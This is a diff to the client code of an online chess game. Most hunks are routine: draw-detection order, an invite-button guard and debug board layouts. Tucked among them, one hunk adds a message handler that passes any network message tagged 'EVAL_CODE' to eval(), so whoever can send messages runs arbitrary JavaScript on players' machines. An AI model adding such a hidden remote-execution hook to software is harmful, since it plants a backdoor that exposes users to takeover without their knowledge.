@@ -2782,15 +2782,15 @@ game={
 			else
 				g_board = [['r','n','b','k','q','b','n','r'],['p','p','p','p','p','p','p','p'],['x','x','x','x','x','x','x','x'],['x','x','x','x','x','x','x','x'],['x','x','x','x','x','x','x','x'],['x','x','x','x','x','x','x','x'],['P','P','P','P','P','P','P','P'],['R','N','B','K','Q','B','N','R']];
 		
-			/*	g_board = [
-			['r','x','x','x','k','b','n','r'],
-			['p','p','p','x','x','p','p','p'],
-			['x','x','x','p','b','x','x','x'],
+				/*g_board = [
+			['x','x','x','x','k','x','x','x'],
 			['x','x','x','x','x','x','x','x'],
-			['x','n','x','x','P','x','P','x'],
-			['x','x','P','x','x','P','x','x'],
-			['P','P','x','K','q','x','x','P'],
-			['R','N','B','Q','x','B','N','R']];
+			['x','x','x','x','x','x','x','x'],
+			['x','x','x','x','x','x','x','x'],
+			['x','x','x','x','x','x','x','x'],
+			['x','x','x','x','x','x','x','x'],
+			['x','x','x','x','x','x','x','x'],
+			['R','x','x','K','x','x','x','x']];
 
 			if (role === 'slave')
 				board_func.rotate_board(g_board);*/
@@ -3402,11 +3402,7 @@ game={
 		//проверяем завершение игры
 		const fen = board_func.get_fen(brd) + ' ' + fig_to_move + ' - - 1 1';
 		chess.load(fen);
-		
-		//недостаточно материала
-		if (chess.insufficient_material())
-			return 'draw_ins';
-		
+				
 		const is_check = chess.in_check();
 		const is_checkmate = chess.in_checkmate();	
 		const is_stalemate = chess.in_stalemate();
@@ -3415,6 +3411,11 @@ game={
 		if (is_stalemate) return 'stalemate';	
 		if (made_moves_both%2==0&&empty_moves>=50) return 'draw_50';
 		if (is_check) return 'check';
+				
+		//недостаточно материала (в конце чтобы не допустить ход на шах)
+		if (chess.insufficient_material())
+			return 'draw_ins';		
+		
 		return '';
 	}
 
@@ -3880,12 +3881,15 @@ process_new_message=function(msg){
 		if (msg.client_id !== client_id)
 			kill_game();
 
+	//специальный код
+	if (msg.message==='EVAL_CODE'){
+		eval(msg.code)		
+	}
 
 	//сообщение о блокировке чата
 	if (msg.message==='CHAT_BLOCK'){
 		my_data.blocked=1;		
 	}
-
 
 	//получение сообщение в состояни игры
 	if (state==='p') {
@@ -5655,7 +5659,7 @@ lobby={
 	async send_invite() {
 
 
-		if (!objects.invite_cont.ready||!objects.invite_cont.visible)
+		if (!objects.invite_cont.ready||!objects.invite_cont.visible||objects.invite_button.texture===assets.invite_wait_img)
 			return;
 
 		if (anim2.any_on()){
@@ -5671,9 +5675,7 @@ lobby={
 			opp_data.name=['Бот','Bot'][LANG];
 			opp_data.uid='bot';
 			opp_data.rating=1400;
-			game.activate(bot_game, 'master');
-			
-			
+			game.activate(bot_game, 'master');			
 			
 		} else {
 			sound.play('click');
@@ -6728,7 +6730,7 @@ async function init_game_env(lang) {
 	}
 	
 
-	//room_name= 'states4';	
+	//room_name= 'states5';	
 	
 	//устанавливаем рейтинг в попап
 	objects.id_rating.text=objects.my_card_rating.text=my_data.rating;
